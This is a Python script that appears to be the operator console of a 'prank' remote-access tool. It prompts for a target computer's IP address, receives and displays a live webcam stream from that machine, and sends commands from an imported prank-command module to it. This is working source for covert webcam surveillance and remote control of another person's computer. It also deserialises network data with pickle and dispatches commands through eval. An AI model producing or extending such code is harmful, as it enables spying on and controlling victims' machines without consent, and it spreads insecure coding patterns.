
try:
    import socket
    import sys
    import cv2
    import pickle
    import numpy as np
    import struct ## new
    import zlib
    import threading
    import inspect
    import time
    from prankcommands import availableCommands
except Exception as e:
    print(e)
connectTo = '127.0.0.1'           
connectTo = input("Please enter remote computer IPv4 address")
clientOnlyFunctions = ["help"]
def webCamReceive():
    while True:
        try:
            global connectTo
            s = socket.socket()          
              
            # Define the port on which you want to connect 
            port = 8484                
            reachableAt = socket.gethostbyname(socket.gethostname())
            # connect to the server on local computer 
            s.connect((connectTo, port)) 
            s.send(reachableAt.encode())   
            # receive data from the server 
            #print s.recv(1024) 
            # close the connection 
            s.close()        


            HOST=''
            PORT=8485

            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)


            s.bind((HOST,PORT))
            print('Socket bind complete')
            s.listen(10)
            print('Connecting webcam...')

            conn,addr=s.accept()

            data = b""
            payload_size = struct.calcsize(">L")
            print("payload_size: {}".format(payload_size))
            while True:
                while len(data) < payload_size:
                    data += conn.recv(4096)

                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                msg_size = struct.unpack(">L", packed_msg_size)[0]
                while len(data) < msg_size:
                    data += conn.recv(4096)
                frame_data = data[:msg_size]
                data = data[msg_size:]

                frame=pickle.loads(frame_data, fix_imports=True, encoding="bytes")
                frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
                cv2.imshow('ImageWindow',frame)
                cv2.waitKey(1)
        except Exception as e:
            cv2.destroyAllWindows()
            print("Webcam connection failed")
            print(e)
            time.sleep(6)
            print("Webcam connection rebooting")
webcamThread = threading.Thread(target=webCamReceive)
webcamThread.start()
def functionSender(valueString):
    print("sending to the target:", valueString)
    global connectTo
    s = socket.socket()
    port = 8483
    # connect to the server on local computer 
    s.connect((connectTo, port)) 
    s.send(valueString.encode())   
    # receive data from the server 
    #print s.recv(1024) 
    # close the connection 
    s.close()
def commandLine():
    print("Please enter a command or use /help for help")
    while True:
        try:
            command = input()
            commandParts = command.strip("/").split()
            commandParts[0] = commandParts[0].lower()
            if(isinstance(commandParts,str)):
                commandParts = [commandParts]
            if(len(commandParts)<1):
                raise Exception("You didn't enter a command")
            functionName = commandParts[0]
            if not functionName in dir(availableCommands):
                raise Exception(functionName+" does not exist")
            function = "availableCommands."+functionName
            parsedFunction = eval(function)
            commandParts.pop(0)
            args = commandParts
            if(len(args)>parsedFunction.__code__.co_argcount):
                for arg in range(len(args)):
                    if(arg+1>parsedFunction.__code__.co_argcount):
                        print('"'+args[arg]+'"', "was removed from your command because it exceed the number of arguments that command has.")
                        args.pop(arg)
           # print("Debug", dir(availableCommands))
            #Call function on my end of things
            #check = parsedFunction(*args)
            thread = threading.Thread(target=parsedFunction, args=args)
            #print("debug: start")
            check = thread.start()
            #print('debug: end')
            if(functionName in clientOnlyFunctions):
                continue
            sendString = function+","
            for part in commandParts:
                sendString+=(part+",")
            functionSender(sendString)
        except Exception as e:
            print("Command unsucessful:",e)
            print("Please enter a command or use /help for help")
commandLine()

